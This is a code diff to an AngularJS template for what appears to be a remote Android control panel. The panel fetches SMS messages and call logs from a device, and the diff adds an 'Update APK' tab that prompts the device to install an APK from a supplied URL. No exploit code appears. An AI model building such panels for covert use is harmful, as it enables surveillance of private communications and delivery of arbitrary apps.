@@ -13,7 +13,7 @@
         <input class="form-control" type="number" name="number" ng-model="numbersms" required>
       </div>
       <div class="form-group">
-        <button class="btn btn-primary" ng-click="addCommand('getsms', numbersms)">Get SMS</button>
+        <button type="submit" ng-disabled="smsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getsms', numbersms)">Get SMS</button>
       </div>
     </form>
     <hr>
@@ -36,13 +36,13 @@
     </div>
   </uib-tab>
   <uib-tab index="1" heading="Call Logs">
-    <form name="smsForm">
+    <form name="callLogsForm">
       <div class="form-group" ng-class="">
         <label>Number of logs to get</label>
         <input class="form-control" type="number" name="number" ng-model="num_call_logs" required>
       </div>
       <div class="form-group">
-        <button class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">Get Call History</button>
+        <button  ng-disabled="callLogsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">Get Call History</button>
       </div>
     </form>
     <hr>
@@ -68,7 +68,18 @@
       </div>
     </div>
   </uib-tab>
-  <uib-tab index="2" heading="Pending Commands">
+  <uib-tab index="2" heading="Update APK">
+    <form name="updateForm">
+      <div class="form-group" ng-class="">
+        <label>URL of the new apk</label>
+        <input class="form-control" type="text" name="url" ng-model="update_url" required>
+      </div>
+      <div class="form-group">
+        <button  ng-disabled="updateForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Prompt Update</button>
+      </div>
+    </form>
+  </uib-tab>
+  <uib-tab index="3" heading="Pending Commands">
     <div class="list-group">
       <div class="list-group-item" ng-repeat="cmd in pendingCommands">
         {{cmd.command}}
